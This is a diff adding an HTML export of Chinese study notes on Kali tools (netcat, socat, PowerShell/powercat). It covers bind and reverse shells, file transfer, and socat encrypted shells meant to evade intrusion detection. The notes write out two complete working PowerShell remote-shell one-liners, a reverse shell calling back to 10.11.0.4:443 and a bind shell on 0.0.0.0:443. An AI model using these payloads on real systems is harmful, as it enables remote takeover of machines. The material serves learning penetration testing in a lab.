@@ -1,0 +1,748 @@
+<html>
+<head>
+<META http-equiv="Content-Type" content="text/html; charset=UTF-8">
+<meta content="text/html; charset=utf-8" http-equiv="Content-Type">
+<meta content="text/css" http-equiv="Content-Style-Type">
+<title>kali基本工具</title>
+</head>
+<body>
+<h1 align="center" class="root">
+<a name="2rv0cbegesk6mjcideageo8f8k">kali基本工具</a>
+</h1>
+<div align="center" class="globalOverview">
+<img src="kali%E5%9F%BA%E6%9C%AC%E5%B7%A5%E5%85%B7_files/images/kali%E5%9F%BA%E6%9C%AC%E5%B7%A5%E5%85%B7.jpg"></div>
+<h2 class="topic">
+<a name="55u6c7cul4266bhik7nsvavh24">kali基本工具</a>
+</h2>
+<h3 class="topic">
+<a name="1r53dcjhkk56qiggdu479t4qqn">&nbsp;netcat</a>
+</h3>
+<h3 class="topic">
+<a name="326ocs29rme352p321m23gap0f">&nbsp;&nbsp;功能：使用TCP或UDP协议跨网络连接读取和写入数据</a>
+</h3>
+<h3 class="topic">
+<a name="60uf1a8okjab000ubh00c8kfok">&nbsp;&nbsp;&nbsp;一般有两种模式：客户端模式、服务端模式</a>
+</h3>
+<h3 class="topic">
+<a name="36fgmo5o88t9l2bocombe4djgf">&nbsp;&nbsp;链接tcp udp端口</a>
+</h3>
+<h3 class="topic">
+<a name="6iuir2aep9ph8m3mtt6883p5ia">&nbsp;&nbsp;&nbsp;可以使用客户端模式连接到任何TCP / UDP端口，从而&#13;
+检查端口是打开还是关闭。  &#13;
+从服务中侦听端口上的标语&#13;
+手动连接到网络服务</a>
+</h3>
+<h3 class="topic">
+<a name="5v8773c056ig0iekmatag6ggdi">&nbsp;&nbsp;&nbsp;&nbsp;尝试链接ip地址为10.11.0.22机器的110端口（tcp端口用于pop3邮件服务）-n选项可跳过DNS名称解析；  v添加一些详细信息； 目的IP地址； 和目标端口号 ，这里显示110端口开放，并且最后一行输出服务器的欢迎信息</a>
+</h3>
+<p class="topicImage">
+<img src="kali%E5%9F%BA%E6%9C%AC%E5%B7%A5%E5%85%B7_files/42c8tbt77kst2ujvuqps3aokgs.png"></p>
+<h3 class="topic">
+<a name="3ekvfd4q2sl29o75c65t83810q">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;尝试用户名密码登陆该pop3服务，但是登陆失败</a>
+</h3>
+<p class="topicImage">
+<img src="kali%E5%9F%BA%E6%9C%AC%E5%B7%A5%E5%85%B7_files/3kl8qhqbm4nj1su6a94esi0i7p.png"></p>
+<h3 class="topic">
+<a name="3f13rlcrp8vkt97ljvckuup2ao">&nbsp;&nbsp;监听tcp udp端口</a>
+</h3>
+<h3 class="topic">
+<a name="736rd87jb6365p6mfvp5t8mi22">&nbsp;&nbsp;&nbsp;在windows机器中使用netcat工具打开并监听4444端口，-n选项禁用DNS名称解析，使用-l创建侦听器，使用-v添加一些 详细信息，并使用-p指定侦听端口号&lsquo;</a>
+</h3>
+<p class="topicImage">
+<img src="kali%E5%9F%BA%E6%9C%AC%E5%B7%A5%E5%85%B7_files/7o6gnufjj0p09ejbo3pu5m0pd9.png"></p>
+<h3 class="topic">
+<a name="3nfiugdjdvu0a886c75urdnk41">&nbsp;&nbsp;&nbsp;&nbsp;linux中使用nc链接windows的4444端口，向其并发送消息</a>
+</h3>
+<p class="topicImage">
+<img src="kali%E5%9F%BA%E6%9C%AC%E5%B7%A5%E5%85%B7_files/12mdlkbukl2fp1j96est7lpapr.png"></p>
+<h3 class="topic">
+<a name="2ou7egj5ncn83tjgnn0306h6f5">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;windows端接受消息</a>
+</h3>
+<p class="topicImage">
+<img src="kali%E5%9F%BA%E6%9C%AC%E5%B7%A5%E5%85%B7_files/5g1rdmu7pfpp1o7j4rejspbkio.png"></p>
+<h3 class="topic">
+<a name="1vf2lk25nd1f8ooep3p24a1n94">&nbsp;&nbsp;文件传输</a>
+</h3>
+<h3 class="topic">
+<a name="4o3avd9n59srt3u937uffhkgg8">&nbsp;&nbsp;&nbsp;常与dd（磁盘复制程序）结合使用，用于网络传输取证</a>
+</h3>
+<h3 class="topic">
+<a name="5is1kutr72hnfqut508qd4r22l">&nbsp;&nbsp;&nbsp;windows打开并监听4444端口，并将输入重定向到文件中</a>
+</h3>
+<p class="topicImage">
+<img src="kali%E5%9F%BA%E6%9C%AC%E5%B7%A5%E5%85%B7_files/7midp9mq235kmchtue0r3mfg7s.png"></p>
+<h3 class="topic">
+<a name="06f15pgah7kq8f86g0p6ov27nd">&nbsp;&nbsp;&nbsp;&nbsp;linux中将指令路径的文件重定向到nc链接中，发送非windows端</a>
+</h3>
+<p class="topicImage">
+<img src="kali%E5%9F%BA%E6%9C%AC%E5%B7%A5%E5%85%B7_files/2c5j42a0pdhrq8og4kjai2089o.png"></p>
+<h3 class="topic">
+<a name="2oa9pfcan1n4od1amlcbkv7qq2">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;windows端收到链接</a>
+</h3>
+<p class="topicImage">
+<img src="kali%E5%9F%BA%E6%9C%AC%E5%B7%A5%E5%85%B7_files/13d6guv3493o40h39sa8bc8llu.png"></p>
+<h3 class="topic">
+<a name="767dpgfpekro14kio3p9i6vp25">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;因为nc没有传输是否成功的反馈，所以如果传输文件较小，可以等一会，然后尝试执行对应文件</a>
+</h3>
+<p class="topicImage">
+<img src="kali%E5%9F%BA%E6%9C%AC%E5%B7%A5%E5%85%B7_files/79fgmvmr5vo2vf7jfreslmr7de.png"></p>
+<h3 class="topic">
+<a name="5cg4eabubokq8tipgah4vt23e6">&nbsp;&nbsp;远程管理</a>
+</h3>
+<h3 class="topic">
+<a name="4qfmf3560951uhacb26siig8vq">&nbsp;&nbsp;&nbsp;nc工具如果开启了e选项，此选项可以将可执行文件的输入，输出和错误消息重定向到TCP / UDP端口而不是默认控制台，从而实现远程管理</a>
+</h3>
+<h3 class="topic">
+<a name="56i8mje67il7teupcvqg6crb3v">&nbsp;&nbsp;&nbsp;情况1，控制端链接被控制端</a>
+</h3>
+<h3 class="topic">
+<a name="5pgvknfcshuipohtvvil9f6782">&nbsp;&nbsp;&nbsp;&nbsp;被控制端</a>
+</h3>
+<h3 class="topic">
+<a name="3e7j02i2c3bvhvkoe75i6la65n">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;被控制拥有一个公共IP地址，并直接连接到Internet</a>
+</h3>
+<h3 class="topic">
+<a name="4ccco8b7g3ff912k8baru0b7dh">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;被控制端通过nc -e选项将cmd.exe程序绑定到444端口，并且将该程序输入输出重定向到网络</a>
+</h3>
+<p class="topicImage">
+<img src="kali%E5%9F%BA%E6%9C%AC%E5%B7%A5%E5%85%B7_files/4rkjr4n23dmvm9gh47c2e5n7tg.png"></p>
+<h3 class="topic">
+<a name="63os9iq26vvo1fmql669mr9hdf">&nbsp;&nbsp;&nbsp;&nbsp;控制端</a>
+</h3>
+<h3 class="topic">
+<a name="53iqgj3hrcovvjs80sjpcbmlh2">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;控制端位于NAT连接的后面，并且具有内部IP地址。</a>
+</h3>
+<h3 class="topic">
+<a name="31era2colkjve31q0go96qg6n9">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</a>
+</h3>
+<p class="topicImage">
+<img src="kali%E5%9F%BA%E6%9C%AC%E5%B7%A5%E5%85%B7_files/011uq0ea4jieitulv8dmltsjfv.png"></p>
+<h3 class="topic">
+<a name="7qifj5c8g5buc4t8nn5niord5k">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;使用nc链接被控制端的4444端口</a>
+</h3>
+<p class="topicImage">
+<img src="kali%E5%9F%BA%E6%9C%AC%E5%B7%A5%E5%85%B7_files/06ga7skkrg8546bf6bnhgjhdd9.png"></p>
+<h3 class="topic">
+<a name="1psrtokg70kfpigj0p5ahk8mkg">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;得到被控端的shell</a>
+</h3>
+<p class="topicImage">
+<img src="kali%E5%9F%BA%E6%9C%AC%E5%B7%A5%E5%85%B7_files/2lgbhsrcnlt1t2nlqvoelfou20.png"></p>
+<h3 class="topic">
+<a name="2rcajppeceskvkbp7cvid9ufn8">&nbsp;&nbsp;&nbsp;&nbsp;网络拓扑</a>
+</h3>
+<h3 class="topic">
+<a name="35mtlrjt3atlvo8143hed6iin3">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</a>
+</h3>
+<p class="topicImage">
+<img src="kali%E5%9F%BA%E6%9C%AC%E5%B7%A5%E5%85%B7_files/5j1dq9c42g9vbm1ttj1bvrb183.png"></p>
+<h3 class="topic">
+<a name="6dnjdlmd8um4beuta2acq0kgkl">&nbsp;&nbsp;&nbsp;情况2，反弹shell</a>
+</h3>
+<h3 class="topic">
+<a name="6h1fuht1h85k17a6su7i09s0jg">&nbsp;&nbsp;&nbsp;&nbsp;即此时被控制端使用nat链接，即被控制端出于一个nat路由器的内部网络中，所以当控制端尝试链接被控制端的开放的端口时，网络流量无法从nat路由器转发内部网络的被控制端，此时需要反向shell，即被控制端（在nat之后）需要将主动shell发送给控制端</a>
+</h3>
+<h3 class="topic">
+<a name="30c9t1i8cu7fho3tge30m6poi2">&nbsp;&nbsp;&nbsp;&nbsp;控制端</a>
+</h3>
+<h3 class="topic">
+<a name="1a693kdts9079405jgb26nrb9f">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;控制端监听4444端口</a>
+</h3>
+<p class="topicImage">
+<img src="kali%E5%9F%BA%E6%9C%AC%E5%B7%A5%E5%85%B7_files/10e7bvmr9f6a77g1g6nupqsvsb.png"></p>
+<h3 class="topic">
+<a name="3lk2284v7hhp579munqr3vcqb6">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;控制端获得shell</a>
+</h3>
+<p class="topicImage">
+<img src="kali%E5%9F%BA%E6%9C%AC%E5%B7%A5%E5%85%B7_files/45vd545ofkeln006fuqvqig6j4.png"></p>
+<h3 class="topic">
+<a name="0chl484dl7881b71ug04jlr46o">&nbsp;&nbsp;&nbsp;&nbsp;被控制端</a>
+</h3>
+<h3 class="topic">
+<a name="7505q7ounojt85e7nr19vcgfuo">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;被控制端将本地的shell程序主动发送给控制端ip的4444端口</a>
+</h3>
+<p class="topicImage">
+<img src="kali%E5%9F%BA%E6%9C%AC%E5%B7%A5%E5%85%B7_files/3p030n7iia34uguv12a3nuqehs.png"></p>
+<h3 class="topic">
+<a name="1a64171l7cbft2irt7r2bk092l">&nbsp;&nbsp;&nbsp;&nbsp;网络拓扑</a>
+</h3>
+<h3 class="topic">
+<a name="5om0cg5l0qc34v1pigffjpj4vg">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</a>
+</h3>
+<p class="topicImage">
+<img src="kali%E5%9F%BA%E6%9C%AC%E5%B7%A5%E5%85%B7_files/6etnm30stmn2p58dh8nbrb3e5g.png"></p>
+<h3 class="topic">
+<a name="4ktd51lb21fonmi0j94bh21lrm">&nbsp;&nbsp;&nbsp;对于防火墙，传入流量和传出流量同样需要监控，可能导致被控制</a>
+</h3>
+<h3 class="topic">
+<a name="7ho4u4s1l6vmgq5q7h77bfcqb1">&nbsp;Socat</a>
+</h3>
+<h3 class="topic">
+<a name="1agauussm2bv73g6vra48dn3r1">&nbsp;&nbsp;功能与netcat类似</a>
+</h3>
+<h3 class="topic">
+<a name="184vd2dkljrrdn9vq3erfmsq7v">&nbsp;&nbsp;链接远程主机</a>
+</h3>
+<h3 class="topic">
+<a name="1m196pua82aje4b6m8g94l7n57">&nbsp;&nbsp;&nbsp;</a>
+</h3>
+<p class="topicImage">
+<img src="kali%E5%9F%BA%E6%9C%AC%E5%B7%A5%E5%85%B7_files/3713iaiigpd3mjl58q0ildiv9q.png"></p>
+<h3 class="topic">
+<a name="2v0dkemudosnegc3327q4ofj61">&nbsp;&nbsp;本地端口上设置监听器（监听本地端口）</a>
+</h3>
+<h3 class="topic">
+<a name="34sf9sooc2jci54gjvu1elaeak">&nbsp;&nbsp;&nbsp;由于将侦听器绑定到低于1024的端口需要root特权，因此在端口443上启动侦听器时，我们需要使用sudo&#13;
+注意socat需要指定监听器的协议和指定重定向标准输出</a>
+</h3>
+<p class="topicImage">
+<img src="kali%E5%9F%BA%E6%9C%AC%E5%B7%A5%E5%85%B7_files/6btr6a0nuk176fh2uvjf3d2607.png"></p>
+<h3 class="topic">
+<a name="728rr3h53f2sil51c023vdrteo">&nbsp;&nbsp;文件传输</a>
+</h3>
+<h3 class="topic">
+<a name="2nlvbr6d5m3kih90j168tc61gn">&nbsp;&nbsp;&nbsp;文件传输方</a>
+</h3>
+<h3 class="topic">
+<a name="6s04rsf0ogi5tm2fku9khcidq9">&nbsp;&nbsp;&nbsp;&nbsp;指定tcp4协议，监听443端口，一旦链接成功，则fork会创建一个子进程，将file指定的文件名进行传输</a>
+</h3>
+<p class="topicImage">
+<img src="kali%E5%9F%BA%E6%9C%AC%E5%B7%A5%E5%85%B7_files/3prhh3sfohjh5nosbm0pueujll.png"></p>
+<h3 class="topic">
+<a name="3m3ttql3p0tgcnvvh3ej8um4fr">&nbsp;&nbsp;&nbsp;文件接收方</a>
+</h3>
+<h3 class="topic">
+<a name="578q0b3j900ip77a2c0nmoak87">&nbsp;&nbsp;&nbsp;&nbsp;tcp4协议链接文件传输方的443端口，file:指定所下载文件的保存名称，create显示创建该文件</a>
+</h3>
+<p class="topicImage">
+<img src="kali%E5%9F%BA%E6%9C%AC%E5%B7%A5%E5%85%B7_files/10v2ldderm4mjn8ijsscleavur.png"></p>
+<h3 class="topic">
+<a name="0kgv3cbdpf40jd9i7jtf1dli2q">&nbsp;&nbsp;反向shell</a>
+</h3>
+<h3 class="topic">
+<a name="55s9jhbf7arj49ljnpt8p76smh">&nbsp;&nbsp;&nbsp;控制方</a>
+</h3>
+<h3 class="topic">
+<a name="1hk2iohd17k7h7tkellcdaklg3">&nbsp;&nbsp;&nbsp;&nbsp;在443端口创建tcp4的监听器，并将标准输出重定向</a>
+</h3>
+<p class="topicImage">
+<img src="kali%E5%9F%BA%E6%9C%AC%E5%B7%A5%E5%85%B7_files/19q0fdoj338jq0k8fhtrm64sm7.png"></p>
+<h3 class="topic">
+<a name="1n7uicfgbgrh955jkgmu1v772k">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;-d -d选项以增加详细程度（显示致命，错误，警告和通知消息）</a>
+</h3>
+<h3 class="topic">
+<a name="6rimmc752c9cognqt1a4otsmef">&nbsp;&nbsp;&nbsp;&nbsp;获得控制权</a>
+</h3>
+<p class="topicImage">
+<img src="kali%E5%9F%BA%E6%9C%AC%E5%B7%A5%E5%85%B7_files/7fh0lt7mjnkn3hfl1a4ndkfode.png"></p>
+<h3 class="topic">
+<a name="18gslf2rosnr79u3n9aig073ne">&nbsp;&nbsp;&nbsp;被控制方</a>
+</h3>
+<h3 class="topic">
+<a name="52a82coktmik4mrc456d6u9pbk">&nbsp;&nbsp;&nbsp;&nbsp;尝试连接控制方的443端口，并且EXEC制定了连接成功后要执行的shell，类似于netcat 的-e选项</a>
+</h3>
+<p class="topicImage">
+<img src="kali%E5%9F%BA%E6%9C%AC%E5%B7%A5%E5%85%B7_files/3gdnpdmvf72g7gk1lulbuvke53.png"></p>
+<h3 class="topic">
+<a name="0ig5uvis4qsq09s1v8avekltc1">&nbsp;&nbsp;加密的bindshell</a>
+</h3>
+<h3 class="topic">
+<a name="31i7dov6mg9k7ulbrhess6uh12">&nbsp;&nbsp;&nbsp;使用加密的bindshell可以保证数据传输过程中的机密性，从而一定程度避免被流量被入侵检测识别</a>
+</h3>
+<h3 class="topic">
+<a name="1pjjaavqcrpbtlqkqufcjdsi2t">&nbsp;&nbsp;&nbsp;被控制端</a>
+</h3>
+<h3 class="topic">
+<a name="6935lbcsllrkdtd61qoiuh16b8">&nbsp;&nbsp;&nbsp;&nbsp;使用openssl创建加密证书</a>
+</h3>
+<h3 class="topic">
+<a name="64bj1p8jk579dkek8buh2c9aak">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;使用openssl工具可以生成密钥文件.key和证书文件.crt&#13;
+使用cat和重定向将生成的密钥和证数文件合并到.pem文件中，这样符合socat的接收格式</a>
+</h3>
+<p class="topicImage">
+<img src="kali%E5%9F%BA%E6%9C%AC%E5%B7%A5%E5%85%B7_files/5ka4tuqhdhvtnk06vdmg6d59bn.png"></p>
+<h3 class="topic">
+<a name="09jsujveh7mk622b8fakmv573b">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;req：发起新的证书签名请求&#13;
+-newkey：生成一个新的私钥&#13;
+rsa：2048：使用具有2,048位密钥长度的RSA加密。  -nodes：存储没有密码保护的私钥&#13;
+-keyout：将密钥保存到文件中&#13;
+-x509：输出自签名证书而不是证书请求&#13;
+-days：以天为单位设置有效期限&#13;
+-out：将证书保存到文件</a>
+</h3>
+<h3 class="topic">
+<a name="0j1lhqvnbhlk3dqmgfockvhg89">&nbsp;&nbsp;&nbsp;&nbsp;在443端口创建openssl监听器，cert指定认证证书，verify=0从而禁止ssl验证，fork用于指定当连接发生时，创建进程执行shell</a>
+</h3>
+<p class="topicImage">
+<img src="kali%E5%9F%BA%E6%9C%AC%E5%B7%A5%E5%85%B7_files/3b5gfsbu9angfsgna3dne8k59d.png"></p>
+<h3 class="topic">
+<a name="1g6d845mapario7ihv9t8dlj1d">&nbsp;&nbsp;&nbsp;控制端</a>
+</h3>
+<h3 class="topic">
+<a name="7bqfdq6vv8g54gcho56e618qj2">&nbsp;&nbsp;&nbsp;&nbsp;使用openssl协议连接被控制端ip的443端口，并关闭ssl验证，从而获得shell</a>
+</h3>
+<p class="topicImage">
+<img src="kali%E5%9F%BA%E6%9C%AC%E5%B7%A5%E5%85%B7_files/0ei7aan76f4c97c5s4d509vn2o.png"></p>
+<h3 class="topic">
+<a name="5uvu4v42bmck1rfb8e63dl9i0j">&nbsp;PowerShell and Powercat</a>
+</h3>
+<h3 class="topic">
+<a name="21fura0eqqc0nvdv4dsdd0f6kk">&nbsp;&nbsp;windows powershell</a>
+</h3>
+<h3 class="topic">
+<a name="6bkhbsa9j42l46bqb4fub41rbc">&nbsp;&nbsp;&nbsp;介绍</a>
+</h3>
+<h3 class="topic">
+<a name="169qupojouk33didnhkr91cd3g">&nbsp;&nbsp;&nbsp;&nbsp;默认情况下，windows powershell安装在从Windows Server 2008 R2和Windows 7开始的现代Windows平台上</a>
+</h3>
+<h3 class="topic">
+<a name="3i6ojlk34ghoho6hfm7thgrsbp">&nbsp;&nbsp;&nbsp;&nbsp;Windows PowerShell 5.0在以下版本的Windows上运行：</a>
+</h3>
+<h3 class="topic">
+<a name="7n1733bllm060n3e6f3ddnb0te">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Windows Server 2016，默认安装</a>
+</h3>
+<h3 class="topic">
+<a name="0all0qf360chprip7unt02n2da">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;带有Service Pack 1的Windows Server 2012 R2 / Windows Server 2012 / Windows Server 2008 R2 /</a>
+</h3>
+<h3 class="topic">
+<a name="0og1m99bq84906k3q91r40nrf4">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;带有Service Pack 1的Windows 8.1 / Windows 7（安装Windows Management Framework 5.0即可运行）</a>
+</h3>
+<h3 class="topic">
+<a name="1h1bnb1l8tdv15img4gr8s47u8">&nbsp;&nbsp;&nbsp;&nbsp;Windows PowerShell 4.0在以下版本的Windows上运行：</a>
+</h3>
+<h3 class="topic">
+<a name="13ep26hhiat1m61i276ic7ecde">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Windows 8.1 / Windows Server 2012 R2，默认情况下已安装</a>
+</h3>
+<h3 class="topic">
+<a name="16gk4k8ki6kbpnmugtk8k2msjs">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Windows 7 Service Pack 1 / Windows Server 2008 R2 Service Pack 1（安装Windows Management Framework 4.0即可运行）</a>
+</h3>
+<h3 class="topic">
+<a name="5f2jui8tu1e0j78d3e0it1usno">&nbsp;&nbsp;&nbsp;&nbsp;Windows PowerShell 3.0在以下版本的Windows上运行：</a>
+</h3>
+<h3 class="topic">
+<a name="73fqrmiabfvbuo1mfmbog8v711">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Windows 8 / Windows Server 2012，默认安装</a>
+</h3>
+<h3 class="topic">
+<a name="509jgllkrp0ekf8joc2h9rnl8m">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Windows 7 Service Pack 1 / Windows Server 2008 R2 Service Pack 1/2（安装Windows Management Framework 3.0即可运行）</a>
+</h3>
+<h3 class="topic">
+<a name="0spmsmi04tj97stklv0e8tlns3">&nbsp;&nbsp;&nbsp;&nbsp;PowerShell包含内置的集成开发环境（IDE），称为Windows PowerShell集成脚本环境（ISE）</a>
+</h3>
+<h3 class="topic">
+<a name="7jmigbsl0s3knuuvuj0dov9ln4">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</a>
+</h3>
+<p class="topicImage">
+<img src="kali%E5%9F%BA%E6%9C%AC%E5%B7%A5%E5%85%B7_files/6ndd82ns6cpkhi6si2tt5rd07o.png"></p>
+<h3 class="topic">
+<a name="31j0kk9t93e6behnubh0d4ja8q">&nbsp;&nbsp;&nbsp;&nbsp;powershell维护执行策略</a>
+</h3>
+<h3 class="topic">
+<a name="1mtcgacrgmrunve2i0lqoqbd58">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;PowerShell维护执行策略，该策略确定可以在系统上运行哪种类型的PowerShell脚本（如果有）。 默认策略为&ldquo;受限&rdquo;，这实际上意味着系统既不会加载PowerShell配置文件，也不会运行PowerShell脚本。 &#13;
+&#13;
+我们将需要在Windows客户端计算机上设置&ldquo;不受限制&rdquo;的执行策略。 为此，我们单击Windows&ldquo;开始&rdquo;按钮，右键单击Windows PowerShell应用程序，然后选择&ldquo;以管理员身份运行&rdquo;。 当出现用户帐户控制提示时，选择是，然后输入Set-ExecutionPolicy Unrestricted：</a>
+</h3>
+<h3 class="topic">
+<a name="0g2b8f617p3kburnsihbphobaa">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</a>
+</h3>
+<p class="topicImage">
+<img src="kali%E5%9F%BA%E6%9C%AC%E5%B7%A5%E5%85%B7_files/2a7q8ovle6dsmppltk6ad9vh0f.png"></p>
+<h3 class="topic">
+<a name="0f2rafpm8mfk6uvhef0ffuu4ls">&nbsp;&nbsp;&nbsp;文件传输功能</a>
+</h3>
+<h3 class="topic">
+<a name="7tr30i2ngibb61qt7divh1sqti">&nbsp;&nbsp;&nbsp;&nbsp;创建webclient对象，调用其downloadfile方法，从指定url处下载文件到本地指定目录</a>
+</h3>
+<p class="topicImage">
+<img src="kali%E5%9F%BA%E6%9C%AC%E5%B7%A5%E5%85%B7_files/6ldfvbfcigriohvjenjbgi8lag.png"></p>
+<h3 class="topic">
+<a name="15s8fac9eod5kaf221epjvekev">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;-c 表示powershell将执行()中提供的命令，等同于将命令直接输入在powershell提示符中输入</a>
+</h3>
+<h3 class="topic">
+<a name="6ael9ftlld9au95d8gt3nemc22">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&ldquo; new-object&rdquo; 是powershell的命令行指令，该指令允许我们实例化.Net Framework或COM对象。 此时，我们将创建WebClient类的实例，该实例在System.Net命名空间中定义和实现。  WebClient类用于访问URI标识的资源，其拥有DownloadFile的公共方法</a>
+</h3>
+<h3 class="topic">
+<a name="336a2kiast9oeo6uk8r2a3nb7j">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;DownloadFile方法需要我们的两个关键参数：源位置（如前所述，以URI的形式）和将存储检索到的数据的目标位置。</a>
+</h3>
+<h3 class="topic">
+<a name="6gqkjnepr21k4ro54s75bufo20">&nbsp;&nbsp;&nbsp;反弹shell</a>
+</h3>
+<h3 class="topic">
+<a name="7ejia20jmksp1utsuvtkpm8k2t">&nbsp;&nbsp;&nbsp;&nbsp;控制端</a>
+</h3>
+<h3 class="topic">
+<a name="1i32k0dpk57lthbclhs51qh6fa">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;通过nc创建443端口的监听器</a>
+</h3>
+<p class="topicImage">
+<img src="kali%E5%9F%BA%E6%9C%AC%E5%B7%A5%E5%85%B7_files/6uuaj4ogkd8a2d5nb32ho3hqvo.png"></p>
+<h3 class="topic">
+<a name="1aekrnb3t91s0pd8is388158k2">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;控制端收到shell</a>
+</h3>
+<p class="topicImage">
+<img src="kali%E5%9F%BA%E6%9C%AC%E5%B7%A5%E5%85%B7_files/4mc22f3vgvj4t30d67fkcci7m5.png"></p>
+<h3 class="topic">
+<a name="4tqpep9a1c3tqo527uua24oqvn">&nbsp;&nbsp;&nbsp;&nbsp;被控制端</a>
+</h3>
+<h3 class="topic">
+<a name="6dd9ns4or0g5ostpru77sblrpt">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;被控制端需要执行以上代码，从而创建于控制端的连接并执行输入的指令</a>
+</h3>
+<p class="topicImage">
+<img src="kali%E5%9F%BA%E6%9C%AC%E5%B7%A5%E5%85%B7_files/3cfiu41hhhvli6dfhp5qbvfivs.png"></p>
+<h3 class="topic">
+<a name="301om9ees3spcge71js9hnsjae">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;将之前的代码整理为一行在powershell中执行</a>
+</h3>
+<p class="topicImage">
+<img src="kali%E5%9F%BA%E6%9C%AC%E5%B7%A5%E5%85%B7_files/1u3nm80696343jvumvt8nmcpil.png"></p>
+<h3 class="topic">
+<a name="0grdsjbdms01b76vl4flbk607b">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;powershell -c "$client = New-Object System.Net.Sockets.TCPClient('10. 11.0.4',443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.T ext.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2&gt;&amp;1 | Out-String ); $sendback2 = $sendback + 'PS ' + (pwd).Path + '&gt; ';$sendbyte = ([text.encoding]::ASCII ).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$c lient.Close()"</a>
+</h3>
+<h3 class="topic">
+<a name="3tmb5v8ruv5ccf2o2mrme2g6bt">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;替换ip和端口可以重用该代码</a>
+</h3>
+<h3 class="topic">
+<a name="6cmaqqumhjvermjca4roslihpb">&nbsp;&nbsp;&nbsp;绑定shell（bindshell）</a>
+</h3>
+<h3 class="topic">
+<a name="35hbedav5k9aeegogcita0o012">&nbsp;&nbsp;&nbsp;&nbsp;被控制端</a>
+</h3>
+<h3 class="topic">
+<a name="59mo66ejp7h8av83akcn73us6u">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</a>
+</h3>
+<p class="topicImage">
+<img src="kali%E5%9F%BA%E6%9C%AC%E5%B7%A5%E5%85%B7_files/4csq8qs2lm7eejdsjquec9409f.png"></p>
+<h3 class="topic">
+<a name="6h83dkgjefmj2o54c79o68f9aq">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</a>
+</h3>
+<p class="topicImage">
+<img src="kali%E5%9F%BA%E6%9C%AC%E5%B7%A5%E5%85%B7_files/16fo5ifld45a4052udfh71i4th.png"></p>
+<h3 class="topic">
+<a name="37c5ntpivu6bafjiju3b3u7flc">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;创建TcpListene对象从而在被控制端设置监听器，监听ip为0,0,0,0即可以连接任意地址ip对443端口的访问</a>
+</h3>
+<h3 class="topic">
+<a name="0vme3leg8je00r9kk400o1cmhm">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;powershell -c "$listener = New-Object System.Net.Sockets.TcpListener( '0.0.0.0',443);$listener.start();$client = $listener.AcceptTcpClient();$stream = $clie nt.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $byt es.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString ($bytes,0, $i);$sendback = (iex $data 2&gt;&amp;1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '&gt; ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$str eam.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close();$listener.Sto p()"</a>
+</h3>
+<h3 class="topic">
+<a name="3rptaneitft7va8klc6imhfrq5">&nbsp;&nbsp;&nbsp;&nbsp;控制端</a>
+</h3>
+<h3 class="topic">
+<a name="3qm4gr93caiitpf27l6regm5fk">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Netcat包括了-v选项，因为绑定外壳在首次连接时可能不会始终向我们显示命令提示符：</a>
+</h3>
+<p class="topicImage">
+<img src="kali%E5%9F%BA%E6%9C%AC%E5%B7%A5%E5%85%B7_files/2g58ghd3p38ber7n2m190m7ckd.png"></p>
+<h3 class="topic">
+<a name="1o8b6sq4vaukpd5nick048upo2">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;控制端直接通过netcat进行连接</a>
+</h3>
+<h3 class="topic">
+<a name="1a4nqrqv80npu8el2u07l407an">&nbsp;&nbsp;&nbsp;powersehll文档</a>
+</h3>
+<h3 class="topic">
